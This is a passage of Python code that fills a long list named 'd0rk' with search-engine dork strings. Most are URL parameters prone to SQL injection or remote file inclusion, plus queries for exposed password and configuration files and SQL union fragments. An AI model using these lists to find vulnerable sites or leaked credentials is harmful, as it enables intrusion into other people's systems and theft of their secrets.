         'reportEVERESTHomeEdition', 'reportdetail.asp?id', 'reporter.cgi?t', 'reports.php?subreports.php?sub',
         'resellers.asp?idCategory', 'resellers.cfm?idCategory', 'resellers.php?idCategory', 'resource.php?id',
         'resources/category.php?CatID', 'resources/detail.asp?id', 'resources/detail.php?id',
         'resources/index.asp?cat', 'resources/index.php?cat', 'resources/vulnerabilitieslist.asp?id',
         'resources/vulnerabilitieslist.php?id', 'responder.cgi', 'ressource.php?ID']
d0rk += ['restaurant.php?id', 'results.asp?cat', 'results.cfm?cat', 'results.php?cat', 'retail/indexbobby.php?id',
         'review.php?id', 'review/reviewform.asp?itemid', 'review/reviewform.php?itemid', 'reviews.asp?id',
         'reviews.php?id', 'reviews/index.php?cat', 'reviews/moredetails.php?id', 'rfiofthis/embed/day.php?path',
         'rfiofthis/includes/dbal.php?eqdkprootpath', 'rfiofthisenc/content.php?HomePath',
         'rfitorhis/coinincludes/constants.php?CCFG[PKGPATHINCL]', 'rfitothis/classes/adodbt/sql.php?classesdir',
         'rfitothis/header.php?abspath', 'rfitothis/main.php?sayfa', 'rfitothis/mcf.php?content',
         'rfitothis/sources/functions.php?CONFIG[mainpath]', 'rfitothis/sources/template.php?CONFIG[mainpath]',
         'rfitothis/surveys/survey.inc.php?path', 'rmcs/opencomic.phtml?rowid',
         'robot.txt|robots.txtintextdisallowfiletypetxt', 'robots.txt', 'robots.txtDisallowfiletypetxt',
         'root.asp?acsanonOutlookMailWebAccessdirectorycanbe', 'roundsdetail.asp?id', 'roundsdetail.php?id',
         'rpSys.html', 'rss.asp?cat', 'rss.php?cat', 'rss.php?id', 'rss.php?phpraiddir$2', 'rss.php?phpraiddir',
         'rss.php?phpraiddirphpraid', 'rss/event.asp?id', 'rss/event.php?id', 'rtfe.asp?siteid', 'rtfe.php?siteid',
         'rub.php?idr', 'rubp.php?idr', 'rubrika.php?idr', 'rural/rss.php?cat', 'ruta',
         'rymoLogin|intextWelcometorymofamily', 's.asp?w', 's.php?tablephp?table', 's.php?w', 's1.php?lnphp?ln',
         'safehtml', 'savecart.asp?CartId', 'savecart.cfm?CartId', 'savecart.php?CartId', 'schule/termine.asp?view',
         'schule/termine.php?view', 'scripts/comments.php?id', 'seWork.aspx?WORKID', 'search', 'search.asp?CartID',
         'search.cfm?CartID', 'search.php?CartID', 'search.php?cutepath', 'search.php?execsearch.php?exec',
         'search.php?ki', 'search.php?q', 'search.phpvbulletin', 'search/admin.php', 'search/display.asp?BookID',
         'search/display.php?BookID', 'search/index.php?q', 'searchcat.asp?searchid', 'searchcat.cfm?searchid',
         'searchcat.php?searchid', 'secondary.php?id', 'secringextskr|extpgp|extbak', 'section', 'section.asp?section',
         'section.php?id', 'section.php?parent', 'section.php?section', 'sectionpage.php?id', 'secureimgrender.php?p',
         'selectbiblio.php?id', 'sem.php3?id', 'sendmail.cfm', 'sendmail.inc', 'sendpage.php?page',
         'sendreminders.php?includedir', 'sendreminders.php?includedirsendreminders.php?includedir',
         'server.cfgrconpassword', 'serverdbsindexof', 'serverinfoApacheServerInformation', 'serverstatusapache',
         'service.pwd', 'services.php?page', 'servicesdetailsdescription.php?id', 'servlet/webacc', 'setsmodek',
         'setsmodep', 'setsmodes', 'setuptheadministratoruserpivot', 'shareit/readreviews.php?cat',
         'shippinginfo.asp?CartId', 'shippinginfo.cfm?CartId', 'shippinginfo.php?CartId', 'shop', 'shop.asp?a',
         'shop.asp?action', 'shop.asp?bookid', 'shop.asp?cartID', 'shop.asp?id', 'shop.cfm?a', 'shop.cfm?action',
         'shop.cfm?bookid', 'shop.cfm?cartID', 'shop.cgi', 'shop.php?a', 'shop.php?action', 'shop.php?bookid',
         'shop.php?cartID', 'shop.php?dopart&id', 'shop.php?idcat', 'shop.php?prodphp?prod', 'shop.pl/page',
         'shop.pl/pageshop.pl/page', 'shop/booksdetail.asp?bookID', 'shop/booksdetail.php?bookID',
         'shop/category.asp?catid', 'shop/category.php?catid', 'shop/eventshop/productdetail.asp?itemid',
         'shop/eventshop/productdetail.php?itemid', 'shop/index.asp?cPath', 'shop/index.php?cPath',
         'shop/index.php?catid', 'shop/pages.php?page', 'shop/product.php?id', 'shop/productdetails.php?ProdID',
         'shop/products.php?cat', 'shop/products.php?catid', 'shop/products.php?p', 'shop/shop.php?id',
         'shopaddtocart.asp', 'shopaddtocart.asp?catalogid', 'shopaddtocart.cfm', 'shopaddtocart.cfm?catalogid',
         'shopaddtocart.php', 'shopaddtocart.php?catalogid', 'shopadmin.aspShopAdministratorsonly',
         'shopbasket.asp?bookid', 'shopbasket.cfm?bookid', 'shopbasket.php?bookid', 'shopbycategory.asp?catid',
         'shopbycategory.cfm?catid', 'shopbycategory.php?catid', 'shopcafeshopproduct.asp?bookId',
         'shopcafeshopproduct.php?bookId', 'shopcart.asp?title', 'shopcart.cfm?title', 'shopcart.php?title',
         'shopcategory.php?id', 'shopcreatorder.asp', 'shopcreatorder.cfm', 'shopcreatorder.php',
         'shopcurrency.asp?cid', 'shopcurrency.cfm?cid', 'shopcurrency.php?cid', 'shopdbtest.asp', 'shopdc.asp?bookid',
         'shopdc.cfm?bookid', 'shopdc.php?bookid', 'shopdetails.asp?prodid', 'shopdetails.cfm?prodid',
         'shopdetails.php?prodid', 'shopdisplaycategories.asp', 'shopdisplaycategories.cfm',
         'shopdisplaycategories.php', 'shopdisplayproduct.asp?catalogid', 'shopdisplayproduct.cfm?catalogid',
         'shopdisplayproduct.php?catalogid', 'shopdisplayproducts.asp', 'shopdisplayproducts.asp?catid',
         'shopdisplayproducts.cfm', 'shopdisplayproducts.php', 'shopdisplayproducts.php?catid', 'shopexd.asp',
         'shopexd.asp?catalogid', 'shopexd.cfm', 'shopexd.cfm?catalogid', 'shopexd.php', 'shopexd.php?catalogid',
         'shopping.php?id', 'shopping/index.php?id', 'shoppingarticle.php?id', 'shoppingbasket.asp?cartID',
         'shoppingbasket.cfm?cartID', 'shoppingbasket.php?cartID', 'shopprojectlogin.asp', 'shopprojectlogin.cfm',
         'shopprojectlogin.php', 'shopquery.asp?catalogid', 'shopquery.cfm?catalogid', 'shopquery.php?catalogid',
         'shopremoveitem.asp?cartid', 'shopremoveitem.cfm?cartid', 'shopremoveitem.php?cartid']
d0rk += ['shopreviewadd.asp?id', 'shopreviewadd.cfm?id', 'shopreviewadd.php?id', 'shopreviewlist.asp?id',
         'shopreviewlist.cfm?id', 'shopreviewlist.php?id', 'shoptellafriend.asp?id', 'shoptellafriend.cfm?id',
         'shoptellafriend.php?id', 'shopthanks.asp', 'shopthanks.cfm', 'shopthanks.php', 'shopwelcome.asp?title',
         'shopwelcome.cfm?title', 'shopwelcome.php?title', 'shoutbox/expanded.php?conf', 'show', 'show.asp?id',
         'show.php?abre', 'show.php?adresa', 'show.php?b', 'show.php?basedir', 'show.php?channel', 'show.php?chapter',
         'show.php?cmd', 'show.php?corpo', 'show.php?d', 'show.php?disp', 'show.php?filepath', 'show.php?get',
         'show.php?go', 'show.php?header', 'show.php?home', 'show.php?id', 'show.php?inc', 'show.php?incl',
         'show.php?include', 'show.php?index', 'show.php?ir', 'show.php?item', 'show.php?j', 'show.php?ki',
         'show.php?l', 'show.php?left', 'show.php?loader', 'show.php?m', 'show.php?mid', 'show.php?middlePart',
         'show.php?modo', 'show.php?module', 'show.php?my', 'show.php?n', 'show.php?nivel', 'show.php?oldal',
         'show.php?page', 'show.php?page1php?page1', 'show.php?pageweb', 'show.php?pagina', 'show.php?param',
         'show.php?path', 'show.php?play', 'show.php?pname', 'show.php?pre', 'show.php?productphp?product',
         'show.php?productshow.php?product', 'show.php?qry', 'show.php?r', 'show.php?read', 'show.php?recipe',
         'show.php?redirect', 'show.php?root', 'show.php?seccion', 'show.php?second', 'show.php?sp',
         'show.php?thispage', 'show.php?to', 'show.php?type', 'show.php?x', 'show.php?xlink', 'show.php?z',
         'showPage.php?type', 'showStore.asp?catID', 'showStore.cfm?catID', 'showStore.php?catID', 'showan.php?id',
         'showbook.asp?bookid', 'showbook.asp?id', 'showbook.cfm?bookid', 'showbook.php?bookid', 'showbook.php?id',
         'showbug.cgi?id', 'showcode.asp', 'showcv.php?id', 'showfeature.asp?id', 'showfeature.php?id', 'showfile',
         'showimg.php?id', 'showitem.asp?id', 'showitem.cfm?id', 'showitem.php?id', 'showitemdetails.asp?itemid',
         'showitemdetails.cfm?itemid', 'showitemdetails.php?itemid', 'showmedia.php?id', 'shownews.php?cutepath',
         'shownews.php?id', 'showprod.php?p', 'showproduct.asp?cat', 'showproduct.asp?prodid',
         'showproduct.asp?productId', 'showproduct.php?cat', 'showproduct.php?prodid', 'showproduct.php?productId',
         'showproducts.php?cid', 'showsub.asp?id', 'showsub.php?id', 'showthread.php?p', 'showthread.php?t',
         'showthread.php?tid', 'showupload.php?id', 'shprodde.asp?SKU', 'shprodde.cfm?SKU', 'shprodde.php?SKU',
         'shreddercategories.php?id', 'shtml.dll', 'shtml.exe', 'side', 'side.php?arqphp?arq',
         'side.php?tablephp?table', 'side.php?visphp?vis', 'side.php?visside.php?vis', 'signeddetails.php?id',
         'signinfiletypeurl', 'sinarea.asp?areaid', 'sinarea.php?areaid', 'sinformer/n/imprimer.asp?id',
         'sinformer/n/imprimer.php?id', 'singer/detail.asp?siteid', 'singer/detail.php?siteid', 'site.asp?id',
         'site.php?arqphp?arq', 'site.php?id', 'site.php?meiophp?meio', 'site.php?tablephp?table',
         'site/?details&prodid', 'site/cat.php?setlang', 'site/catalog.php?cid', 'site/catalog.php?pid',
         'site/en/listservice.asp?cat', 'site/en/listservice.php?cat', 'site/marketingarticle.php?id',
         'site/products.asp?prodid', 'site/products.php?prodid', 'site/public/newsitem.php?newsID',
         'site/view8b.php?id', 'siteadministrationpleaseloginsitedesignedbyemarketsouth', 'sitebuildercontent',
         'sitebuilderfiles', 'sitebuilderpictures', 'siteeduadmingrades', 'sitehp.netThePHPGroupsourceurlextHp',
         'siteid', 'siteinfoforEnterAdminPassword', 'sitelist.php?sort', 'sitenetcraft.comThat.Site.RunningApache',
         'sitephp.netThePHPGroupsourceurlextpHp', 'sitescope.htmlsitescopeintextrefreshdemo',
         'mailinator.comShowMail.do', 'sitio.php?abre', 'sitio.php?addr', 'sitio.php?body', 'sitio.php?category',
         'sitio.php?chapter', 'sitio.php?content', 'sitio.php?destino', 'sitio.php?disp', 'sitio.php?doshow',
         'sitio.php?e', 'sitio.php?ev', 'sitio.php?get', 'sitio.php?go', 'sitio.php?goFile', 'sitio.php?inc',
         'sitio.php?incl', 'sitio.php?index', 'sitio.php?ir', 'sitio.php?left', 'sitio.php?menu', 'sitio.php?menue',
         'sitio.php?mid', 'sitio.php?middlePart', 'sitio.php?modo', 'sitio.php?name', 'sitio.php?nivel',
         'sitio.php?oldal', 'sitio.php?opcion', 'sitio.php?option', 'sitio.php?pageweb', 'sitio.php?param',
         'sitio.php?pg', 'sitio.php?pr', 'sitio.php?qry', 'sitio.php?r', 'sitio.php?read', 'sitio.php?recipe',
         'sitio.php?redirect', 'sitio.php?root', 'sitio.php?rub', 'sitio.php?sec', 'sitio.php?secao', 'sitio.php?secc',
         'sitio.php?section', 'sitio.php?sivu', 'sitio.php?sp', 'sitio.php?start', 'sitio.php?strona', 'sitio.php?t',
         'sitio.php?texto', 'sitio.php?tipo', 'sitio/item.asp?idcd', 'sitio/item.php?idcd', 'skin',
         'skins/advanced/advanced1.php?pluginpath[0]', 'skins/advanced/advanced1.php?pluginpath[0]Sabdrimer',
         'skins/advanced/advanced1.php?pluginpath[0]SabdrimerCMS',
         'skins/advanced/advanced1.php?pluginpath[0]skins/advanced/advanced1.php?pluginpath[0]CMS',
         'skins/advanced/advanced1.php?pluginpath[0]skins/advanced/advanced1.php?pluginpath[0]SabdrimerCMS',
         'skunkworks/content.asp?id', 'skunkworks/content.php?id',
         'slapd.confintextcredentialsmanpageManualPagemansample']
d0rk += ['slapd.confintextrootpwmanpageManualPagemansample', 'smartyconfig.php?rootdir',
         'smartyconfig.php?rootdirsmarty', 'smb.confintextworkgroupfiletypeconfconf', 'snitzforums2000.mdb',
         'snitzforums2000.mdbssl.conffiletypeconf', 'socsci/events/fulldetails.asp?id',
         'socsci/events/fulldetails.php?id', 'socsci/newsitems/fullstory.asp?id', 'socsci/newsitems/fullstory.php?id',
         'soesignaction.php?id', 'software', 'softwarecategories.asp?catid', 'softwarecategories.php?catid',
         'solpot.html?body', 'solpot.html?bodyport.php?content', 'solutions/item.php?id', 'song.php?ID', 'source.asp',
         'sources/join.php?FORM[url]owned&CONFIG[captcha]1&CONFIG[path]', 'specialoffers/moredetails.php?id',
         'specials.asp?id', 'specials.asp?osCsid', 'specials.cfm?id', 'specials.php?id', 'specials.php?osCsid',
         'specials/SpecialsPick.php?id', 'specials/nationvdo/showvdo.php?cateid', 'speeddating/booking.php?id',
         'sport.asp?revista', 'sport.php?revista', 'sport/sport.php?id', 'spr.php?id', 'spwd.db/passwd', 'sql.php?id',
         'ss.php?id', 'ssi', 'ssl.conffiletypeconf', 'staff/publications.asp?sn', 'staff/publications.php?sn',
         'staffid', 'stafflist/profile.php?id', 'standard.php?', 'standard.php?[]', 'standard.php?abre',
         'standard.php?action', 'standard.php?basedir', 'standard.php?body', 'standard.php?channel',
         'standard.php?chapter', 'standard.php?cmd', 'standard.php?cont', 'standard.php?destino', 'standard.php?dir',
         'standard.php?e', 'standard.php?ev', 'standard.php?eval', 'standard.php?go', 'standard.php?goFile',
         'standard.php?goto', 'standard.php?home', 'standard.php?in', 'standard.php?include', 'standard.php?index',
         'standard.php?j', 'standard.php?lang', 'standard.php?link', 'standard.php?menu', 'standard.php?middle',
         'standard.php?my', 'standard.php?name', 'standard.php?numero', 'standard.php?oldal', 'standard.php?op',
         'standard.php?open', 'standard.php?pagina', 'standard.php?panel', 'standard.php?param',
         'standard.php?phpbbrootpath', 'standard.php?pollname', 'standard.php?pr', 'standard.php?pre',
         'standard.php?pref', 'standard.php?q', 'standard.php?qry', 'standard.php?ref', 'standard.php?s',
         'standard.php?secc', 'standard.php?seccion', 'standard.php?section', 'standard.php?showpage',
         'standard.php?sivu', 'standard.php?str', 'standard.php?subject', 'standard.php?url', 'standard.php?var',
         'standard.php?viewpage', 'standard.php?w', 'standard.php?where', 'standard.php?xlink', 'standard.php?z',
         'start.managing.the.deviceremotepbxacc', 'start.php?abre', 'start.php?addr', 'start.php?adresa', 'start.php?b',
         'start.php?basedir', 'start.php?basepath', 'start.php?body', 'start.php?chapter', 'start.php?cmd',
         'start.php?corpo', 'start.php?destino', 'start.php?eval', 'start.php?go', 'start.php?header', 'start.php?home',
         'start.php?idphp?id', 'start.php?idstart.php?id', 'start.php?in', 'start.php?include', 'start.php?index',
         'start.php?ir', 'start.php?lang', 'start.php?langphp?lang', 'start.php?langstart.php?lang', 'start.php?load',
         'start.php?loader', 'start.php?mid', 'start.php?modo', 'start.php?modphp?mod', 'start.php?modstart.php?mod',
         'start.php?module', 'start.php?name', 'start.php?nivel', 'start.php?o', 'start.php?oldal', 'start.php?op',
         'start.php?option', 'start.php?p', 'start.php?pagephp?page', 'start.php?pagestart.php?page',
         'start.php?pageweb', 'start.php?pagstart.php?pag', 'start.php?panel', 'start.php?param', 'start.php?pg',
         'start.php?pgstart.php?pg', 'start.php?play', 'start.php?pname', 'start.php?pollname',
         'start.php?pstart.php?p', 'start.php?root', 'start.php?rub', 'start.php?secao', 'start.php?seccion',
         'start.php?seite', 'start.php?showpage', 'start.php?sivu', 'start.php?sp', 'start.php?sphp?s',
         'start.php?sstart.php?s', 'start.php?str', 'start.php?strona', 'start.php?thispage', 'start.php?tipo',
         'start.php?where', 'start.php?xlink', 'startlobby.php?CONFIG[MWCHATLibs]', 'stat.asp?id', 'stat.htm',
         'stat.php?id', 'static', 'static.asp?id', 'static.php?id', 'statisticsofadvancedwebstatistics',
         'statrep.nsfgov', 'stats.htm', 'stats.html', 'stats.txt', 'status.cgi?hostall', 'stdetail.php?prodID',
         'stepone.php?serverinc', 'steponetables.php?serverinc', 'stockistslist.asp?areaid', 'stockistslist.php?areaid',
         'store.asp?catid', 'store.asp?id', 'store.cfm?id', 'store.php?catid', 'store.php?id',
         'store/customer/product.php?productid', 'store/default.asp?cPath', 'store/default.php?cPath',
         'store/description.asp?iddesc', 'store/description.php?iddesc', 'store/detail.php?prodid',
         'store/home.asp?cat', 'store/home.php?cat', 'store/index.asp?catid', 'store/index.php?catid',
         'store/item.php?id', 'store/mcart.php?ID', 'store/newsstory.php?id', 'store/product.asp?productid',
         'store/product.php?productid', 'store/products.php?catid', 'store/showcat.php?catid', 'store/store.php?catid',
         'store/storedetail.php?id', 'store/viewitems.asp?id', 'store/viewitems.php?id', 'storebycat.asp?id',
         'storebycat.cfm?id', 'storebycat.php?id', 'storedetail.php?ID', 'storedetails.asp?id', 'storedetails.cfm?id',
         'storedetails.php?id', 'storefront.asp?id', 'storefront.cfm?id', 'storefront.php?id', 'storefronts.asp?title',
         'storefronts.cfm?title', 'storefronts.php?title', 'storeitem.asp?item']
d0rk += ['storeitem.cfm?item', 'storeitem.php?item', 'storelisting.asp?id', 'storelisting.cfm?id',
         'storelisting.php?id', 'storemanager/contents/item.asp?pagecode', 'storemanager/contents/item.php?pagecode',
         'storeproddetails.php?ProdID', 'story.asp?id', 'story.php?id', 'str', 'str.php?langstr.php?lang',
         'str.php?lnstr.php?ln', 'str.php?lstr.php?l', 'str.php?pagestr.php?page', 'str.php?pstr.php?p', 'strona',
         'sub', 'sub.php?', 'sub.php?OpenPage', 'sub.php?[]', 'sub.php?abre', 'sub.php?action', 'sub.php?adresa',
         'sub.php?b', 'sub.php?basedir', 'sub.php?basepath', 'sub.php?body', 'sub.php?category', 'sub.php?channel',
         'sub.php?chapter', 'sub.php?cont', 'sub.php?content', 'sub.php?corpo', 'sub.php?destino', 'sub.php?g',
         'sub.php?go', 'sub.php?goFile', 'sub.php?header', 'sub.php?id', 'sub.php?include', 'sub.php?ir',
         'sub.php?itemnav', 'sub.php?j', 'sub.php?k', 'sub.php?lang', 'sub.php?left', 'sub.php?link', 'sub.php?load',
         'sub.php?menue', 'sub.php?menusub.php?menu', 'sub.php?mid', 'sub.php?middle', 'sub.php?mod', 'sub.php?modo',
         'sub.php?module', 'sub.php?my', 'sub.php?name', 'sub.php?oldal', 'sub.php?op', 'sub.php?open',
         'sub.php?option', 'sub.php?pa', 'sub.php?pag', 'sub.php?panel', 'sub.php?path', 'sub.php?phpbbrootpath',
         'sub.php?play', 'sub.php?pname', 'sub.php?pre', 'sub.php?qry', 'sub.php?recipe', 'sub.php?root', 'sub.php?rub',
         'sub.php?s', 'sub.php?sec', 'sub.php?secao', 'sub.php?secc', 'sub.php?seite', 'sub.php?sp',
         'sub.php?ssub.php?s', 'sub.php?str', 'sub.php?subsub.php?sub', 'sub.php?thispage', 'sub.php?u',
         'sub.php?viewpage', 'sub.php?where', 'sub.php?z', 'subcat.php?catID', 'subcategories.asp?id',
         'subcategories.cfm?id', 'subcategories.php?id', 'subcategory.php?id', 'subcategorypage.php?id', 'submit.cgi',
         'subscribe.pl', 'suffering/newssummpopup.php?newscode', 'summary.asp?PID', 'summary.php?PID', 'sup.php?id',
         'superleague/newsitem.php?id', 'superlinks/browse.php?id', 'supervisioncamprotocol', 'support',
         'support/mailling/maillist/inc/initdb.php?absolutepath', 'supportpage.cgi?filename',
         'supportpage.cgi?filenameindex.php?include', 'survey.cgi', 'surveys', 'suse/login.pl', 'swcomment.php?id',
         'switchloginIBMFastEthernetDesktop', 'sysinfointextGeneratedbySysinfowrittenbyTheGamblers.',
         'tak/index.php?module', 'tales.php?id', 'tas/event.asp?id', 'tas/event.php?id', 'task.php?taskphp?task',
         'task.php?tasktask.php?task', 'tdbin', 'teamspeakserveradministration', 'tecdaten/showdetail.asp?prodid',
         'tecdaten/showdetail.php?prodid', 'tek9.asp?', 'tek9.cfm?', 'tek9.php?', 'tekken5/movelist.php?id',
         'tekst.php?idt', 'template.asp?ActionItem&pid', 'template.cfm?ActionItem&pid', 'template.php?',
         'template.php?ActionItem&pid', 'template.php?ID', 'template.php?[]', 'template.php?a', 'template.php?addr',
         'template.php?basedir', 'template.php?basepath', 'template.php?c', 'template.php?choix', 'template.php?cont',
         'template.php?content', 'template.php?corpo', 'template.php?dir', 'template.php?doshow', 'template.php?e',
         'template.php?f', 'template.php?goto', 'template.php?h', 'template.php?header', 'template.php?ir',
         'template.php?k', 'template.php?lang', 'template.php?left', 'template.php?load', 'template.php?menue',
         'template.php?mid', 'template.php?mod', 'template.php?name', 'template.php?nivel', 'template.php?op',
         'template.php?opcion', 'template.php?pag', 'template.php?page', 'template.php?page/template.php?pagephp',
         'template.php?pagina', 'template.php?panel', 'template.php?param', 'template.php?path', 'template.php?play',
         'template.php?pre', 'template.php?qry', 'template.php?ref', 'template.php?s', 'template.php?secao',
         'template.php?second', 'template.php?section', 'template.php?seite', 'template.php?sekce',
         'template.php?showpage', 'template.php?sp', 'template.php?str', 'template.php?t', 'template.php?texto',
         'template.php?thispage', 'template.php?tipo', 'template.php?viewpage', 'template.php?where', 'template.php?y',
         'template1.php?id', 'templet.asp?acticleid', 'templet.php?acticleid', 'test.bat', 'test.cgi', 'test.php?page',
         'testcgi', 'testcgixitami', 'textpattern/index.php', 'theatershow.php?id', 'theme.php?THEMEDIR',
         'theme.php?id', 'thingstodo/detail.asp?id', 'thingstodo/detail.php?id', 'thisproxyisworkingfine!enterURLvisit',
         'thread.php/id', 'title.php?id', 'today.asp?eventid', 'today.php?eventid', 'tools/print.asp?id',
         'tools/print.php?id', 'tools/sendreminders.php?includedir', 'tools/toolscat.php?c', 'top/store.php?catid',
         'top10.php?cat', 'topic.asp?ID', 'topic.cfm?ID', 'topic.php?ID', 'topsecretsitemil', 'touchy/home.php?cat',
         'tour.php?id', 'tourdetail.php?id', 'tourism/details.php?id', 'toynbeestudios/content.asp?id',
         'toynbeestudios/content.php?id', 'trackback.php?id', 'trade/listings.php?Id', 'tradeCategory.php?id',
         'trailer.asp?id', 'trailer.php?id', 'trailerdetail.php?id', 'trainers.php?id', 'trans.php?transphp?trans',
         'trans.php?transtrans.php?trans', 'transcript.php?id', 'tresc', 'trillian.ini', 'trvltime.php?id',
         'ttawlogin.cgi/?action', 'tuangou.asp?bookid', 'tuangou.cfm?bookid', 'tuangou.php?bookid',
         'tutorial.php?articleid', 'tutorials/view.php?id', 'twikiTWikiUsers', 'type.asp?iType', 'type.cfm?iType']
d0rk += ['type.php?iType', 'typedatabashcommandprompt;usernames', 'typo3/index.php?udemo', 'ultraboard.cgi',
         'unionselectSHOP', 'unionselectadmin', 'unionselectfrom', 'unionselectpass', 'unknown.soldier',
         'updatebasket.asp?bookid', 'updatebasket.cfm?bookid', 'updatebasket.php?bookid', 'updates.asp?ID',
         'updates.cfm?ID', 'updates.php?ID', 'upgradealbum.php?GERYBASEDIR', 'upload.asp', 'urchin5|3|adminextcgi',
         'url', 'usar/productDetail.php?prodID', 'usb/devices/showdev.asp?id', 'usb/devices/showdev.php?id',
         'used/cardetails.php?id', 'usedtodiscoverusernames', 'user', 'user/AboutAwardsDetail.php?ID', 'user0x3apass',
         'userlist', 'users.pwd', 'users/view.php?id', 'usysinfo?logintrue', 'utilities/TreeView.asp',
         'v/showthread.php?t', 'vBulletinVersion1.1.5', 'vBulletinVersion1.1.5?', 'vb/showthread.php?p',
         'vb/showthread.php?t', 'vbstats.phppagegenerated', 'ventrilosrv.iniadminpassword', 'venuedetails.php?id',
         'veranstaltungen/detail.asp?id', 'veranstaltungen/detail.php?id', 'version0x3adatabse',
         'vhostintextvHost.20002004', 'vhostintextvHost.20002004?', 'video.php?content', 'video.php?id',
         'videos/view.php?id', 'view.asp?cid', 'view.asp?id', 'view.asp?pageNumrscomp', 'view.cfm?cid', 'view.php?',
         'view.php?[]', 'view.php?adresa', 'view.php?b', 'view.php?body', 'view.php?channel', 'view.php?chapter',
         'view.php?choix', 'view.php?cid', 'view.php?cmd', 'view.php?content', 'view.php?disp', 'view.php?get',
         'view.php?go', 'view.php?goFile', 'view.php?goto', 'view.php?header', 'view.php?id', 'view.php?incl',
         'view.php?ir', 'view.php?ki', 'view.php?lang', 'view.php?load', 'view.php?loader', 'view.php?mid',
         'view.php?middle', 'view.php?mod', 'view.php?oldal', 'view.php?option', 'view.php?pag', 'view.php?page',
         'view.php?pageNumrscomp', 'view.php?panel', 'view.php?pg', 'view.php?phpbbrootpath', 'view.php?pollname',
         'view.php?pr', 'view.php?qry', 'view.php?recipe', 'view.php?redirect', 'view.php?rootdir', 'view.php?sec',
         'view.php?secao', 'view.php?seccion', 'view.php?second', 'view.php?seite', 'view.php?showpage', 'view.php?sp',
         'view.php?str', 'view.php?subview.php?sub', 'view.php?tablephp?table', 'view.php?to', 'view.php?type',
         'view.php?u', 'view.php?userid', 'view.php?var', 'view.php?vid', 'view.php?where', 'view/7/9628/1.html?reply',
         'view/index.shtml', 'view/indexFrame.shtml', 'view/view.shtml', 'viewCart.asp?userID', 'viewCart.cfm?userID',
         'viewCart.php?userID', 'viewCath.asp?idCategory', 'viewCath.cfm?idCategory', 'viewCath.php?idCategory',
         'viewPrd.asp?idcategory', 'viewPrd.cfm?idcategory', 'viewPrd.php?idcategory', 'viewapp.asp?id',
         'viewapp.php?id', 'viewarticle.php?id', 'viewauthor.asp?id', 'viewauthor.php?id', 'viewcart.asp?CartId',
         'viewcart.asp?title', 'viewcart.cfm?CartId', 'viewcart.cfm?title', 'viewcart.php?CartId', 'viewcart.php?title',
         'viewcompany.php?id', 'viewdetail.asp?ID', 'viewdetail.cfm?ID', 'viewdetail.php?ID', 'viewevent.asp?EventID',
         'viewevent.asp?id', 'viewevent.cfm?EventID', 'viewevent.php?EventID', 'viewevent.php?eid', 'viewevent.php?id',
         'viewfaq.php?id', 'viewgantt.php?rootdir', 'viewitem.asp?id', 'viewitem.asp?item', 'viewitem.asp?recor',
         'viewitem.cfm?recor', 'viewitem.php?id', 'viewitem.php?item', 'viewitem.php?recor', 'viewitems.asp?id',
         'viewitems.php?id', 'viewmedia.php?prmMID', 'viewnewsletter.asp?id', 'viewnewsletter.php?id',
         'viewphoto.php?id', 'viewproduct.php?id', 'viewproduct.php?prod', 'viewproducts.php?id', 'viewprofile.php?id',
         'viewratings.php?cid', 'viewshowdetail.php?id', 'viewsongs.php?catid', 'viewsource', 'viewstore.php?catid',
         'viewthread.asp?tid', 'viewthread.php?tid', 'viewtopic.php?id', 'viewtopic.php?pid', 'villadetail.php?id',
         'voir.php?incphp?inc', 'volunteers/item.php?id', 'vote.pl?actionshow&id', 'voteList.asp?itemID',
         'voteList.cfm?itemID', 'voteList.php?itemID', 'vsadmin/login|vsadmin/admin.php|.asp', 'vtiinf.html',
         'vtund.confintextpasscvs', 'vtund.confintextpasscvss', 'vwfiles.php?rootdir', 'w3msql', 'wais.pl',
         'wampdir/setup/yesno.phtml?nourl', 'wampdir/setup/yesno.phtml?nourlsetup', 'warningerroronlinephpsablotron',
         'wayboard.cgi', 'wbemcompaqlogin', 'wbemcompaqloginCompaqInformationTechnologiesGroup', 'web', 'webaccess.htm',
         'webalizerfiletypepng.gov.edu.milopendarwin',
         'webcyradm|byLucdeLouwThisisonlyforauthorizeduserstar.gzsitewebcyradm.org', 'webdist.cgi', 'webdriver',
         'webgais', 'webmail./index.plInterface', 'webpage.cgi', 'websendmail', 'webserverstatusSSHTelnet',
         'website.php?id', 'webstore.cgi', 'webutil.pl', 'webvpn.htmlloginPleaseenteryour', 'weekly/story.php?storyid',
         'welcome.to.squeezebox', 'welcometonetwaresitenovell.com', 'werbungFrame.php?dophp?do', 'whatelieveb.php?id',
         'whatsnew.asp?idCategory', 'whatsnew.cfm?idCategory', 'whatsnew.php?idCategory', 'where/details.php?id',
         'whereami.cgi?gid', 'whereami.cgi?gidauktion.pl?menue', 'whereusernamepassword', 'wiki/pmwiki.asp?page',
         'wiki/pmwiki.php?page', 'word.php?id', 'worklog/task.php?id', 'workshopview.php?id', 'worthies/details.php?id',
         'wpmail.phpTheredoesntseemtobeanynewmail.', 'wpmail.phpTheredoesn?tseemtobeanynewmail.', 'wrap',
         'write.php?dir', 'wvdial.confintextpassword', 'wwdsemea/default.asp?ID']
d0rk += ['index.asp?page', 'index.php?page', 'board.pl', 'boardWebAdminpasswd.txt board webadmin', 'root/', 'root/.',
         'sql', 'stats.html', 'x/product.php?productid', 'xampp/phpinfo', 'xams0.0.0..15Login', 'xcart/home.php?cat',
         'xcart/product.php?productid', 'yabbse/Sources/Packages.php?sourcedir', 'yachtsearch/yachtview.asp?pid',
         'yachtsearch/yachtview.php?pid', 'yahoobyKietu?v3.2', 'yapbozdetay.aspViewWebcamUserAccessing',
         'yarndetail.php?id', 'youcannowpassword|thisisaspecialpageonlyseenbyyou.yourprofilevisitorsimchaos',
         'yourpasswordisfiletypelog', 'zb/view.asp?uid', 'zb/view.php?uid', 'zboard/zboard.php',
         'zebra.confintextpasswordsampletesttutorialdownload', 'zentrack/index.php?configFile', 'zine/board.asp?board',
         'zine/board.php?board']
d0rk += ['/administrator/components/comjcs/view/register.php?mosConfigabsolutepath',
         '/administrator/components/comjoom12pic/admin.joom12pic.php?mosConfiglivesite',
         '/administrator/components/comjoomlaradiov5/admin.joomlaradiov5.php?mosConfiglivesite',
         '/administrator/components/comlinkdirectory/toolbar.linkdirectory.html.php?mosConfigabsolutepath',
         '/administrator/components/commgm/help.mgm.php?mosConfigabsolutepath',
         '/administrator/components/compeoplebook/param.peoplebook.php?mosConfigabsolutepath',
         '/administrator/components/comremository/admin.remository.php?mosConfigabsolutepath',
         '/administrator/components/comring/admin.ring.docs.php?componentdir',
         '/administrator/components/comserverstat/inst.serverstat.php?mosConfigabsolutepath',
